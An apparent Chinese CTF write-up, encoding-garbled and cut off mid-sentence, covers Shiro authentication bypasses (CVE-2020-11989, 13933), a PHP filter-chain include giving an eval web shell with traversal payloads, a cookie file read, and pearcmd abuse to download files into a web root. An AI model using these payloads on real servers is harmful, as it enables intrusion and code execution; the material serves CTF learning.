å±äºæ˜¯åŸé¢˜äº†å±äºæ˜¯å±äºæ˜¯å±äºæ˜¯çƒ¤çƒ‚äº†å·²ç»ï¼Œå‚è§ [çº¢æ˜è°·CTF 2021] JavaWeb | [å¤©ç¿¼æ¯ 2021] jackson | [NPUCTF2020] EzShiro ï¼ˆè™½ç„¶æˆ‘è‡ªå·±æ ¹æœ¬æ²¡å‘ç° å®åœ¨æ˜¯åšè¿‡çš„é¢˜å¤ªå°‘äº† javaæ›´æ˜¯ä¸ä¼š æˆ‘çš„\n/loginä¸‹æœ‰ä¸ªç™»å½•ï¼Œå›æ˜¾/jsonï¼Œè¿”å›çš„cookieæœ‰ä¸ªrememberMe=deleteMeï¼Œå¯ä»¥çŸ¥é“æ˜¯shiro\nè®¿é—®/jsonï¼Œåé¢ä¼šå¸¦ä¸€å †getè¯·æ±‚çš„å‚æ•°ï¼Œç”¨/;/jsonç»•è¿‡ï¼ˆcve-2020-11989ï¼‰\nä¸Šå·¥å…·JNDI-Injection-Exploitä¸€æŠŠæ¢­ï¼ˆé—®é¢˜å‡ºåœ¨æˆ‘vpsä¸Šæ²¡æœ‰javaç¯å¢ƒ ç«¯å£è½¬å‘åˆå¤„äº†äº¿ç‚¹ç‚¹é—®é¢˜â€¦â€¦ æ‰€ä»¥æ²¡æœ‰å¸¦å‡ºæ¥flagï¼‰ï¼Œæ˜¯cve-2020-36188\nå“­å“­\nè¿˜æœ‰ä¸ªå·¥å…·æ˜¯ LdapBypassJndiï¼Œå·®ä¸å¤šçš„ï¼›ä¸‹é¢æ˜¯è·Ÿä¸€è·Ÿæ¶‰åŠåˆ°çš„å‡ ä¸ªé“¾å­\nCVE-2020-11989 å‚è€ƒï¼šApache Shiroæƒé™ç»•è¿‡æ¼æ´åˆ†æ(CVE-2020-11989) | Apache Shiro èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ (CVE-2020-11989)\nApache Shiroæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„javaå®‰å…¨æ¡†æ¶ï¼Œåœ¨1.5.3ä¹‹å‰ç‰ˆæœ¬ä¸­å½“Shiroä¸SpringåŠ¨æ€æ§åˆ¶å™¨ä¸€èµ·ä½¿ç”¨æ—¶ï¼ˆSpringæ¡†æ¶ä¸­åªç”¨Shiroé‰´æƒï¼‰ï¼Œå¦‚æœç›´æ¥è®¿é—®/shiro/admin/pageä¼š302è·³è½¬è¦æ±‚ç™»å½•ï¼Œè€Œè®¿é—®/;shiro/admin/pageå³å¯ç»•è¿‡æƒé™éªŒè¯ï¼Œè®¿é—®/adminçš„ä¿¡æ¯\næœ¬åœ°ç¯å¢ƒæ­å»º\u0026amp;å¤ç° æœ‰å¸¦ä½¬ç›´æ¥å†™å¥½çš„dockerå¯ä»¥ç›´æ¥pullæ‹¿æ¥ç”¨\ndocker pull jackey0/cve-2020-11989 docker run -p 8426:8080 \u0026lt;image\u0026gt; /bin/sh -c \u0026#39;java -jar /springboot-shiro-0.0.1-SNAPSHOT.jar\u0026#39; docker pull jackey0/cve-2020-13933 // docker start \u0026lt;container-id\u0026gt; æˆ–è€…ä¸‹è½½l3yx/springboot-shiroé¡¹ç›®åˆ°æœ¬åœ°ç¼–è¯‘ä¸ºwaråŒ…ï¼ˆæˆ–è€…ä¹Ÿæœ‰ç¼–è¯‘å¥½çš„shiro.warï¼‰ä¹‹åæ‰‹åŠ¨æ”¾å…¥tomcatä¸‹çš„webappsç›®å½•ä¸‹è¿è¡Œã€‚æ˜¾ç„¶dockerå¤ªé¦™äº†ï¼ï¼ï¼ï¼ï¼\nè®¿é—®æ˜ å°„åˆ°å¤–éƒ¨çš„8426ç«¯å£ï¼Œç¯å¢ƒæ­å»ºå®Œæ¯•\npostæ–¹å¼è¯·æ±‚/doLoginé¡µé¢ï¼Œçœ‹åˆ°cookieä¸­å«rememberMe=deleteMeï¼Œç¡®å®šä¸ºshiro\nè®¿é—®/admin/pageé¡µé¢ï¼Œ302é‡å®šå‘è‡³/loginé¡µé¢è¦æ±‚ç™»å½•\nè®¿é—®/;/admin/pageé¡µé¢ï¼Œç»•è¿‡é‰´æƒï¼Œå›æ˜¾admin page\næºç åˆ†æ\u0026amp;åŠ¨è°ƒ å…ˆæŠŠjaråŒ…ä¸‹è½½åˆ°åœ¨æœ¬åœ°ï¼Œå¯¼å…¥idea\ndocker cp \u0026lt;container-id\u0026gt;:/springboot-shiro-0.0.1-SNAPSHOT.jar /home/name/t3mp/ ä½¿ç”¨ideaè¿œç¨‹å¯¹dockerä¸­éƒ¨ç½²çš„springbooté¡¹ç›®è¿›è¡Œdebug\ndocker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c \u0026#39;java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar\u0026#39; Shiroçš„æƒé™æ ¡éªŒæ˜¯é€šè¿‡åˆ¤æ–­urlçš„åŒ¹é…æ¥è¿›è¡Œçš„ï¼Œå¦‚æœShiroè·å–çš„urlå’Œwebæ¡†æ¶å¤„ç†çš„urlç»“æœä¸ä¸€è‡´æ—¶å°±é€ æˆäº†æƒé™ç»•è¿‡ï¼›Shiroå¯¹äºurlçš„è·å–å’ŒåŒ¹é…åœ¨org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChainä¸­è¿›è¡Œã€‚\nä»¥è®¿é—®/;/admin/pageä¸ºä¾‹ï¼Œé€šè¿‡å®ƒçš„getPathWithinApplication()å¾—åˆ°çš„requestURI=\u0026quot;/\u0026quot;\nè·Ÿå…¥æ­¤å‡½æ•°çš„å¤„ç†é€»è¾‘org.apache.shiro.web.util.WebUtils#getPathWithinApplicationï¼Œè¿›å…¥getRequestUri()\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ä¸­é—´è¿‡ç¨‹ä¸­uri=\u0026quot;/;/admin/page\u0026quot;ï¼Œä½†æ˜¯ä»ä¸Šé¢æˆ‘ä»¬å¯ä»¥çŸ¥é“ç»è¿‡normalize(decodeCleanUriString())å¤„ç†è¿‡åè¿”å›çš„requestRUI=\u0026quot;/\u0026quot;ï¼Œè·Ÿå…¥è¿™ä¸ªå‡½æ•°ï¼Œå®ƒå…ˆæ˜¯è°ƒç”¨decodeRequestSrting()ï¼Œæ²¡æœ‰å¯¹ç»“æœäº§ç”Ÿä»€ä¹ˆå½±å“ï¼Œ\nè€Œè¿”å›æ—¶çš„normalize()ä¼šæ ¹æ®\u0026quot;;\u0026ldquo;è¿›è¡Œurlçš„æˆªæ–­å¤„ç†ï¼Œæœ€ç»ˆè¿”å›\u0026rdquo;/\u0026quot;\nå›åˆ°å¼€å¤´çš„/;/admin/pageè¯·æ±‚ï¼Œspringä¸­å¤„ç†urlçš„å‡½æ•°åœ¨org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping\nå®ƒè°ƒç”¨çš„æ˜¯springframeworkä¸­è‡ªå·±getPathWithinApplication()ï¼Œç»è¿‡ä¸€ç•ªéªšæ“ä½œè¿”å›çš„æ˜¯/admin/page\nè·Ÿå…¥getPathWitinApplication()ï¼Œå…ˆæ˜¯è°ƒç”¨getContextPath()ï¼Œè¿”å›\u0026quot;/\u0026quot;\nç„¶åæ˜¯getRequestUri()\nåŒæ ·ï¼Œåœ¨æœ€ç»ˆreturnä¹‹å‰çš„uri=\u0026quot;/;/admin/page\u0026quot;ï¼Œç»è¿‡äº†ä¸€ä¸ªdecodeAndCleanUriString()ï¼Œæ ¹æ®ch=59ä¹Ÿå°±æ˜¯\u0026quot;;\u0026ldquo;ç¬¦è¿›è¡Œä¸€ä¸ªåˆ†å‰²ï¼Œä½¿ç”¨removeSemicolonContentInternal()\näºæ˜¯\u0026rdquo;;\u0026ldquo;å°±ä¸è§äº†\nç„¶åè¿”å›\u0026rdquo;/admin/page\u0026quot;ç»™getPathWithinApplication()\nå†ä¼ é€’ç»™getPathWithinServletMapping()\næœ€ç»ˆæˆ‘ä»¬è®¿é—®åˆ°çš„é¡µé¢å°±æ˜¯\u0026quot;/admin/page\u0026quot;äº†\nâ€”â€”â€”â€”æ€»ç»“ä¸€ä¸‹å°±æ˜¯å½“urlåœ¨shiroå’Œspringä¸­çš„å¤„ç†ä¸ä¸€è‡´ï¼Œå½“è¿›å…¥åº”ç”¨æ—¶è¢«è®¤ä½œæ˜¯è®¿é—®\u0026quot;/;/admin/page\u0026quot;ï¼Œä¸å±äºæˆ‘ä»¬æœ€åˆé…ç½®çš„\u0026quot;/admin/*\u0026ldquo;æƒé™è·¯ç”±ï¼Œè€Œè¿›å…¥shiroåå´è¢«æˆªæ–­å¤„ç†ï¼Œè®¤ä½œæ˜¯\u0026rdquo;/admin/page\u0026quot;ï¼Œå±äºæƒé™è·¯ç”±ä¸­ï¼Œæœ€ç»ˆåšåˆ°æƒé™ç»•è¿‡\nCVE-2020-13933 ç”±äº11989çš„ä¿®è¡¥å¹¶ä¸å®Œå…¨ï¼Œå¯¼è‡´åˆåˆåˆè¢«ç»•è¿‡äº§ç”Ÿäº†13933â€¦â€¦\næœ¬åœ°ç¯å¢ƒæ­å»º\u0026amp;å¤ç° å‚è€ƒï¼šshiro \u0026lt; 1.6.0çš„è®¤è¯ç»•è¿‡æ¼æ´åˆ†æ(CVE-2020-13933)\nè¿˜æ˜¯é‡‡ç”¨dockerå½¢å¼å¤ç°ï¼ˆæˆ‘çˆ±dockerï¼‰è¿™é‡Œç›´æ¥å°±æ˜¯è¿œç¨‹è°ƒè¯•çš„å¯åŠ¨å‘½ä»¤å•¦ï¼Œè·Ÿä¸Šé¢çš„ä¸€æ ·é…ç½®å°±å¥½äº†ï¼ˆ\ndocker pull jackey0/cve-2020-13933 docker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c \u0026#39;java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar\u0026#39; è®¿é—®/adminï¼ŒæŠ¥é”™é¡µé¢ä¸”æ— 302è·³è½¬ï¼›è®¿é—®/loginè·³è½¬åˆ°èº«ä»½éªŒè¯é¡µé¢ï¼›è®¿é—®/admin/%3bpageï¼Œæ— èº«ä»½éªŒè¯ä¸”è¿”å›admin page\nåŸç†åˆ†æ\u0026amp;åŠ¨è°ƒ è¿˜æ˜¯å¯¼å…¥jaråŒ…è‡³ideaï¼Œè¿œç¨‹debug\nç›´æ¥çœ‹çœ‹shiro1.6.0çš„è¡¥ä¸è¡¥åˆ°äº†ä»€ä¹ˆåœ°æ–¹ï¼Œåœ¨githubä¸ŠæŸ¥çœ‹diff\nå¢åŠ äº†InvalidRequestFilterç±»ï¼Œæœ‰ä¸ªisAccessAllowed()å‡½æ•°ï¼Œåœ¨å…¨å±€ä¸Šå¯¹åˆ†å·ã€åæ–œæ ã€éASCIIç å­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤\nä»¥è®¿é—®/admin/%3bpageä¸ºä¾‹ï¼Œurlå…ˆç”±shiroè§£æï¼Œè¿˜æ˜¯org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChainï¼Œä¾æ—§æ˜¯è°ƒç”¨getPathWithinApplication()ï¼Œæ‰§è¡ŒårequestURI=\u0026quot;/admin/\u0026quot;\nè€Œä¹‹åè¿›å…¥springbootå¤„ç†æ—¶ï¼Œå´å˜æˆäº†\u0026quot;/admin/;page\u0026quot;\nå†å›åˆ°æœ€åˆè·Ÿä¸€ä¸‹å…·ä½“çš„è°ƒç”¨é“¾\nåœ¨removeSemicolon()å¤„ç†å‰ï¼Œuri=\u0026quot;/admin/;page\u0026quot;ï¼ˆç»decodeAndUriString()è§£ç äº†ï¼‰\nå¤„ç†åpath=\u0026quot;/admin\u0026quot;ï¼Œæ¥ç€è°ƒç”¨normalize()å‡½æ•°å˜æˆ\u0026quot;/admin\u0026quot;ï¼Œä¼ é€’ç»™æœ€åˆçš„getChain()ä¸­çš„requestURIå‚æ•°\nä¹‹åè¢«springå¤„ç†org.springframework.web.util.UrlPathHelper#getPathWithinServletMappingï¼Œå…¶ä¸­ä¼šè°ƒç”¨getRequestUri()ï¼Œå®ƒä¼šå†æ¬¡è°ƒç”¨decodeAndCleanUriString()\nå…ˆremoveSemicolonContent()å†decodeRequestString()ï¼Œé‚£æ˜¾ç„¶æ˜¯æ€ä¹ˆéƒ½å»ä¸æ‰\u0026quot;;\u0026ldquo;äº†ï¼Œå°†\u0026rdquo;;page\u0026quot;çœ‹ä½œä¸€ä¸ªæ•´ä½“\næˆ‘ä»¬å›è¿‡å¤´å»çœ‹è¿™æ¬¡çš„æƒé™è®¾ç½®æ˜¯æ€ä¹ˆåŒ¹é…urlçš„ï¼Œå®šä½åˆ°org.syclover.srpingbootshiro.LoginControllerå’Œorg.syclover.srpingbootshiro.ShiroConfig#shiroFilterFactoryBean\nå¯ä»¥çœ‹åˆ°ï¼Œå¯¹äº\u0026quot;/admin/*\u0026ldquo;éœ€è¦é‰´æƒï¼Œ\u0026quot;/admin/{name}\u0026ldquo;è¿”å›admin pageï¼Œè€Œå¯¹äº\u0026rdquo;/admin/\u0026ldquo;å´æ²¡æœ‰è®¾ç½®æƒé™\nä»ä¸Šé¢çš„è°ƒè¯•ä¸­æˆ‘ä»¬çŸ¥é“shiroå¾—åˆ°çš„æ˜¯\u0026rdquo;/admin/\u0026quot;ï¼ˆå…ˆdecodeå†å»é™¤\u0026rdquo;;\u0026quot;ï¼‰ï¼Œè¢«è®¤ä½œå¯ä»¥è®¿é—®ï¼›è€Œspringå¾—åˆ°çš„æ˜¯\u0026quot;/admin/;page\u0026quot;ï¼‰å…ˆå»é™¤\u0026quot;;\u0026ldquo;å†decodeï¼‰ï¼Œä¸\u0026rdquo;/admin/{name}\u0026ldquo;çš„æ ·å¼åŒ¹é…ï¼Œæœ€åè¿”å›admin page ï¼ˆç®€ç›´å¤ªå®Œç¾äº†ä¹Ÿ\n*ä¸´æ—¶ä¿®å¤ ï¼ˆæœ¬åœ°æš‚æ—¶è¿˜æœªå¤ç°\nmap.put(\u0026#34;/admin/**\u0026#34;, \u0026#34;authc\u0026#34;); @GetMapping({\u0026#34;/admin/page\u0026#34;}) public String admin() { return \u0026#34;admin page\u0026#34;; } ***CVE-2020-36188 ch.qos.logback.core.db.JNDIConnectionSource\nå¯ä»¥å‚è€ƒ https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiroï¼Œå·¥å…· LdapBypassJndi | JNDI-Injection-Exploit\nâ€”â€”â€”â€”ç”±äºæˆ‘çš„javaæ°´å¹³å®åœ¨å¤Ÿå‘›ï¼Œè¿™é‡Œæš‚æ—¶å…ˆç©ºç€ï¼Œç­‰æˆ‘å­¦ä¸€å­¦java ä¹‹åå¿…å®šå›æ¥é­å°¸\nEasyFilter \u0026lt;?php ini_set(\u0026#34;open_basedir\u0026#34;,\u0026#34;./\u0026#34;); if(!isset($_GET[\u0026#39;action\u0026#39;])){ highlight_file(__FILE__); die(); } if($_GET[\u0026#39;action\u0026#39;] == \u0026#39;w\u0026#39;){ @mkdir(\u0026#34;./files/\u0026#34;); $content = $_GET[\u0026#39;c\u0026#39;]; $file = bin2hex(random_bytes(5)); file_put_contents(\u0026#34;./files/\u0026#34;.$file,base64_encode($content)); echo \u0026#34;./files/\u0026#34;.$file; }elseif($_GET[\u0026#39;action\u0026#39;] == \u0026#39;r\u0026#39;){ $r = $_GET[\u0026#39;r\u0026#39;]; $file = \u0026#34;./files/\u0026#34;.$r; include(\u0026#34;php://filter/resource=$file\u0026#34;); } /?action=w\u0026amp;c=\u0026lt;?php @eval($_POST[\u0026#39;wuhu\u0026#39;]);?\u0026gt; /?action=r\u0026amp;r=php://filter/read=convert.base64-decode/resource=/../../../../../files/f8b3731ac9 POST: wuhu=phpinfo(); å¯¹äºpayloadçš„åº•å±‚ä»£ç åˆ†æ åŸç†åˆ†ææ¥è‡ªGuokeä½¬ æˆ‘åªæ˜¯ä¸ªä¼šå¤ç°çš„é“æ²¸ç‰©â€¦â€¦\né¦–å…ˆä¸‹ä¸€ä»½7.2.34çš„æºç \nå®šä½åˆ°åŒ…è£…å™¨æ‰€åœ¨çš„æ–‡ä»¶ä½ç½®/ext/standard/php_fopen_wrapper.cï¼Œ178è¡Œèµ·æ˜¯php_stream_url_wrap_php()çš„ä»£ç \n191è¡Œï¼Œå…ˆç¢°åˆ°php://ä¼šæ‰§è¡Œpath += 6ï¼›ä¹‹åæ¥ç€349è¡Œä¼šç¢°åˆ°filter/\næ²¡æœ‰modeï¼Œæ­¤æ—¶\npath=filter/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt 357è¡Œæ‰§è¡Œstrdup()ï¼ŒæŠŠpathç¬¬6ä½ä¹‹åçš„å†…å®¹èµ‹ç»™pathdupæŒ‡é’ˆä¸Š\npathdup=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt 358è¡Œstrstr()è¿”å›pathdupçš„æŒ‡é’ˆä¸­/resource=å‡ºç°çš„ä½ç½®ï¼Œåˆ°365è¡Œçš„åˆ¤æ–­\np+10=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt 372è¡Œçš„php_strtok_r()å¯¹pathdup+1çš„ä½ç½®ä»¥\u0026rsquo;/\u0026lsquo;ä¸ºæ ‡å¿—è¿›è¡Œåˆ†å‰²\np=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt å¾—åˆ°resource=ï¼Œè¿›373è¡Œçš„whileå¾ªç¯ï¼Œå…ˆæ˜¯åˆ°378è¡Œçš„php_stream_apply_filter_list()ï¼Œè½¬è‡³159è¡Œ\nå°†pä½œä¸ºè¿‡æ»¤å™¨è¿›è¡Œæ³¨å†Œï¼Œ161è¡Œphp_stream_filter_append()åº”ç”¨åˆ°æ–‡ä»¶æµä¸Šï¼Œä½†æ˜¾ç„¶resourceä¸æ˜¯æµåŒ…è£…å™¨ï¼Œå¹²ä¸äº†äº‹ï¼Œé‚£å°±å†åˆ°whileå¾ªç¯é‡Œæ¥ç€å‘åæ‰¾ï¼Œç›´åˆ°å‘åç¢°åˆ°read\np=/read=convert.base64-decode/resource=/../../../../../1.txt è¿›å…¥374è¡Œï¼Œæ‰§è¡Œphp_stream_apply_filter_listä¹‹åå°±å˜æˆäº†\np=convert.base64-decode/resource=/../../../../../1.txt æ­¤æ—¶çš„p=convert.base64-decodeï¼Œå°±å¯ä»¥æ­£å¸¸çš„b64è§£ç æˆ‘ä»¬çš„å†…å®¹äº†\nå†å›å¤´çœ‹è¿™ä¸ªé¢˜ ä»£ç å¾ˆçŸ­ï¼Œé™åˆ¶åœ¨äºå†™å…¥çš„æ–‡ä»¶å†…å®¹è¢«b64åŠ å¯†\u0026amp;open_basedir\u0026amp;includeå·²ç»å†™å¥½çš„åŒ…è£…å™¨å’Œä¸€éƒ¨åˆ†å›ºå®šçš„å†…å®¹\næˆ‘åˆšå¼€å§‹å¡åœ¨äº†å·²ç»å†™æ­»çš„åŒ…è£…å™¨çš„å¼€å¤´è¿˜æ€ä¹ˆåŠ conver.base64-decodeï¼Ÿç„¶åå‘ç°æ˜¯æˆ‘æƒ³å¤šäº†ï¼Œå¯ä»¥æ¥ç€å¥—ï¼Œåº•å±‚åŸç†è§ä¸Šï¼Œä¼šå‘åå¾ªç¯å–å€¼ç›´åˆ°ç¢°åˆ°ä¸€ä¸ªæ­£å¸¸çš„æµåŒ…è£…å™¨\nç¬¬äºŒä¸ªé—®é¢˜å°±æ˜¯ç›®å½•ç©¿è¶Šäº†ï¼Œå‰é¢åŠ äº†5å±‚buffï¼Œä»ç»“æœå€’æ¨æ„Ÿè§‰å¯ä»¥ç†è§£ï¼Œä½†æ˜¯è‡ªå·±å´æ²¡è¯•å‡ºæ¥ï¼Œæˆ‘çš„é—®é¢˜\næœ€åopen_basedirçš„ç»•è¿‡åè€Œæ˜¯æœ€è½»æ¾çš„ï¼Œèšå‰‘æ’ä»¶ç›´æ¥æ\nå‚è€ƒï¼šæ·±å…¥ç†è§£PHPä¹‹require/includeé¡ºåº | Exploit with PHP Protocols / Wrappers | è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨\nnew_hospital å“åº”cookieä¼šæœ‰ä¸ªAPI\nå°†APIè®¾ä¸ºflag.php ZmxhZy5waHA%3d\næ‰«ç›®å½• å¾—åˆ°/old/feature.php å°†è·¯å¾„æ”¹ä¸ºè¿™ä¸ª\nå°†APIæ”¹ä¸º../flag.php Li4vZmxhZy5waHA%3d\nâ€”â€”â€”â€”å…¶å®å¦‚æœå…ˆæ‰«ç›®å½•æ‰«åˆ°/old/feature.phpçš„è¯ï¼Œå¯ä»¥å°†APIè®¾ä¸º./feature.php Li9mZWF0dXJlLnBocA%3d%3d è¯»åˆ°è¿™ä¸€æ®µ\nåç«¯çš„é€»è¾‘å°±æ˜¯å°†cookie[\u0026lsquo;api\u0026rsquo;]å–å‡ºï¼Œç›´æ¥è¯»å‡ºå†…å®¹\næœ‰ä¸€ç‚¹ç‚¹è„‘æ´ï¼Œä¹Ÿè·Ÿçœ¼åŠ›è§æœ‰å…³ç³»ï¼Œæˆ‘ä¸€å¼€å§‹æ˜¯çœŸæ²¡æ³¨æ„åˆ°è¿™ä¸ªcookieçš„APIå­—æ®µï¼Œå±å®æ˜¯æœ‰ç‚¹å¤§ç—…ï¼›ä¹‹ååšé¢˜è¿˜æ˜¯è¦å¼€ç¯å¢ƒä¹‹åå°±è¿burpï¼Œæ³¨æ„è§‚å¯Ÿå“åº”å¤´çš„ç‰¹æ®Šå­—æ®µ cookieçš„ç±»å‹/ctrl+uçš„æºç /å¯èƒ½ä¼šæœ‰çš„æ§åˆ¶å°çš„æç¤ºä¿¡æ¯/robots.txtè¿™äº›ä¸œè¥¿ï¼Œä¸è¦é—æ¼ï¼Œä¸ç„¶å°±å¾ˆå¯æƒœäº†\nGive_me_you_0day è¿™é‡Œè€ƒå¯Ÿçš„ç‚¹å¹¶ä¸æ˜¯Typecho 1.1/17.10.30ç‰ˆæœ¬çš„0dayï¼ˆç»™å‡ºçš„æºç å°±å®Œå…¨æ˜¯githubä¸Šçš„å‘è¡Œç‰ˆï¼‰ï¼Œè€Œæ˜¯install.phpä¸­ 608è¡Œå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«\nåˆ©ç”¨è¿™ä¸ªæ–‡ä»¶åŒ…å«çš„ç‚¹æ¥æï¼Œpayloadå¯ä»¥ç›´æ¥å‚è€ƒ[RCTF 2021] VerySafe\næ‰“çš„ç‚¹åœ¨äºpeclcmdï¼Œè¿™é‡Œæ¶‰åŠåˆ°çš„é¢˜å’ŒçŸ¥è¯†å®³æŒºå¤šï¼Œä¹‹å‰çœŸæ²¡è§è¿‡ï¼ˆdbqæ˜¯æˆ‘åšçš„é¢˜å¤ªå°‘å¤ªå°‘äº†ï¼‰ï¼Œåœ¨è¿™é‡Œä¸€å¹¶å­¦ä¹ äº†\nå…³äºregister_argc_argvé…ç½®é¡¹ æ˜¯php.iniæ ¸å¿ƒé…ç½®ä¸­çš„ä¸€ä¸ªé€‰é¡¹ï¼Œé»˜è®¤æ˜¯è¿™æ ·\næ‰‹å†Œæ˜¯è¿™æ ·å†™çš„\nä»php=4.0.0åä¸ºå¯è®¾ç½®çš„é€‰é¡¹ï¼ˆæ­¤å‰æ€»ä¸ºOnï¼‰é»˜è®¤ä¸ºå¼€å¯çŠ¶æ€ï¼Œå½“php\u0026lt;=4.2.3æ—¶å¯ä¿®æ”¹èŒƒå›´æ˜¯PHP_INI_ALLï¼Œæ›´è¯¦ç»†çš„å†…å®¹å¯ä»¥å‚è§-\u0026gt;PHPçš„å‘½ä»¤è¡Œæ¨¡å¼\nåœ¨register_argc_argvå¼€å¯çš„æƒ…å†µä¸‹ï¼Œcgiå’Œcliæ¨¡å¼ä¸‹éƒ½å¯ä»¥ç›´æ¥è®¿é—®åˆ°ä¼ å…¥çš„å‚æ•°ï¼›å…¶ä¸­argcæ˜¯ä¼ é€’è¿‡å»çš„å‚æ•°çš„ä¸ªæ•°ï¼Œargvæ˜¯åŒ…å«æœ‰å®é™…å‚æ•°çš„æ•°ç»„ï¼›cliæ¨¡å¼æµ‹è¯•å¦‚ä¸‹\n\u0026lt;?php var_dump($_SERVER[\u0026#39;argv\u0026#39;]); // var_dump($HTTP_SERVER_VARS[\u0026#39;argv\u0026#39;]); var_dump($argv); cgiçš„è¯ï¼Œç›´æ¥ç”¨ä¸Šé¢çš„$_SERVER['argv']æ˜¯ä¸ä¼šè·å–åˆ°å€¼\nç›´æ¥æŸ¥çœ‹$_SERVERè¿™ä¸ªå¤§æ•°ç»„ï¼Œå¯ä»¥å‘ç°æˆ‘ä»¬çš„å‚æ•°åœ¨è¿™é‡Œæ˜¯ä»¥ä¸€æ•´ä¸ªQUERY_STRINGçš„å½¢å¼å‡ºç°çš„ï¼ˆè¯¦ç»†çš„æ•°ç»„è§£æ-\u0026gt;PHPè¶…å…¨å±€å˜é‡$_SERVERçš„ç”¨æ³•ï¼‰\næœ‰ä¸ªç‰¹æ®Šçš„trickåœ¨äºï¼Œå¦‚æœæ˜¯\n/test.php?a=1\u0026amp;b=1 ç¡®å®æ˜¯ä¸¤ä¸ªå‚æ•°ï¼Œä½†è¿”å›çš„$_SERVER[\u0026lsquo;argv\u0026rsquo;]ä¸º1ï¼Œå¦‚æœæ˜¯\n/test.php?a=1+b=1 åˆ™ä¼šè¢«æˆªæ–­ï¼Œè¿”å›$_SERVER[\u0026lsquo;argv\u0026rsquo;]åˆ™ä¸º2ï¼ˆè¯´å®è¯æˆ‘æœ¬åœ°çœŸæ²¡è·‘å‡ºæ¥è¿™ä¸ª å¯èƒ½æ˜¯å“ªé‡Œçš„é…ç½®æœ‰é—®é¢˜ï¼Ÿä½†æ˜¯çœ‹äº†å¾ˆå¤šèµ„æ–™ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å¯ä»¥è¢«å¤ç°æˆåŠŸçš„â€¦â€¦â€¦â€¦â€¦â€¦emmmm æœ‰ä¸€ç‚¹ç‚¹ç¦»è°±ï¼‰\nå…³äºpearå‘½ä»¤ pearæ˜¯the PHP Extention and Application Repositoryçš„ç¼©å†™ï¼Œæ˜¯ä¸€ä¸ªPHPæ‰©å±•ä¸åº”ç”¨çš„ä»£ç ä»“åº“ï¼Œpearä»“åº“ä»£ç ä»¥åŒ…packageåˆ†åŒºï¼Œæ¯ä¸€ä¸ªpear packageéƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„é¡¹ç›®ï¼Œæœ‰è‡ªå·±ç‹¬ç«‹çš„å¼€å‘å›¢é˜Ÿã€ç‰ˆæœ¬æ§åˆ¶ã€æ–‡æ¡£å’Œå…¶ä»–åŒ…çš„ä¾èµ–å…³ç³»ä¿¡æ¯ï¼›pear packageä»¥phar, tar, zipå½¢å¼å‘å¸ƒï¼Œé€šè¿‡apt install php-pearæ¥å®‰è£…\npearå‘½ä»¤çš„å®ç°æ˜¯ä¸€ä¸ªshè„šæœ¬\n#!/bin/sh # first find which PHP binary to use if test \u0026#34;x$PHP_PEAR_PHP_BIN\u0026#34; != \u0026#34;x\u0026#34;; then PHP=\u0026#34;$PHP_PEAR_PHP_BIN\u0026#34; else if test \u0026#34;/usr/local/bin/php\u0026#34; = \u0026#39;@\u0026#39;php_bin\u0026#39;@\u0026#39;; then PHP=php else PHP=\u0026#34;/usr/local/bin/php\u0026#34; fi fi # then look for the right pear include dir if test \u0026#34;x$PHP_PEAR_INSTALL_DIR\u0026#34; != \u0026#34;x\u0026#34;; then INCDIR=$PHP_PEAR_INSTALL_DIR INCARG=\u0026#34;-d include_path=$PHP_PEAR_INSTALL_DIR\u0026#34; else if test \u0026#34;/usr/local/lib/php\u0026#34; = \u0026#39;@\u0026#39;php_dir\u0026#39;@\u0026#39;; then INCDIR=`dirname $0` INCARG=\u0026#34;\u0026#34; else INCDIR=\u0026#34;/usr/local/lib/php\u0026#34; INCARG=\u0026#34;-d include_path=/usr/local/lib/php\u0026#34; fi fi exec $PHP -C -q $INCARG -d data.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir=\u0026#34;\u0026#34; -d safe_mode=0 -d register_argc_argv=\u0026#34;On\u0026#34; -d auto_prepend_file=\u0026#34;\u0026#34; -d auto_append_file=\u0026#34;\u0026#34; $INCDIR/pearcmd.php \u0026#34;$@\u0026#34; ä»æœ€åä¸€è¡Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†/pearcmd.phpï¼Œè€Œè¿™ä¸ªpearcmd.phpçš„å‚æ•°$argvå°±æ¥æºäº$_SERVER[\u0026lsquo;argv\u0026rsquo;]ï¼Œè¿™ä¸ªæ˜¯æˆ‘ä»¬å¯æ§çš„ä¼ å…¥å‚æ•°\nåˆ©ç”¨pearå‘½ä»¤æ‰§è¡Œä»»æ„æ–‡ä»¶ä¸‹è½½ å¦‚å›¾ï¼Œç›´æ¥ä¸‹è½½å¼€å¯äº†httpæœåŠ¡å™¨çš„ç›®å½•ä¸‹çš„æŒ‡å®šæ–‡ä»¶åˆ°å½“å‰æ‰€åœ¨ç›®å½•\nä½¿ç”¨install -Rè€Œédownloadå¯ä»¥æ§åˆ¶ä¸‹è½½åˆ°ä»»æ„ç›®å½•ï¼Œæ¯”å¦‚ç›´æ¥ä¸‹è½½åˆ°webæœåŠ¡çš„ç›®å½•\næ‰€ä»¥æ€»ä½“æ€è·¯+payload å¦‚æœå­˜åœ¨è¿™æ ·çš„ç¯å¢ƒ\nå®‰è£…pear å¼€å¯register_argc_argv å­˜åœ¨å¯æ§çš„ä¼ 